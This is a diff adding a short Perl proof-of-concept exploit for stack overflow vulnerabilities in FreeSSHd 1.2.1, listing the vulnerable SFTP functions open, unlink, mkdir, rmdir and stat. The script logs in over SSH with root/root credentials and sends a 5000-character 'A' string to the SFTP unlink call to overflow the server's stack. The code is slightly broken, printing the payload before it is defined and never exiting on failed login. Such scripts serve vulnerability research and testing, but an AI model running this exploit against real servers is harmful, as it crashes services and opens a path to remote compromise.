@@ -1,0 +1,34 @@
+# FreeSSHd Multiple Remote Stack Overflow Vulnerabilities. 
+#
+# Version : 1.2.1
+#
+# Note: All below functions are vulnerable. 
+# open
+# unlink
+# mkdir
+# rmdir
+# stat
+
+use Net::SSH2;
+
+my $user = "root";
+my $pass = "root";
+
+my $ip = "127.0.0.1";
+my $port = 22;
+
+my $ssh2 = Net::SSH2->new();
+
+print "[+] Connecting...\n";
+$ssh2->connect($ip, $port) || die "[-] Unable to connect!\n";
+$ssh2->auth_password($user, $pass) || "[-] Incorrect credentials\n";
+print "[+] Sending payload\n";
+
+print $payload;
+my $payload = "A" x 5000;
+
+my $sftp = $ssh2->sftp();
+$sftp->unlink($payload);
+
+print "[+] Sent";
+$ssh2->disconnect;
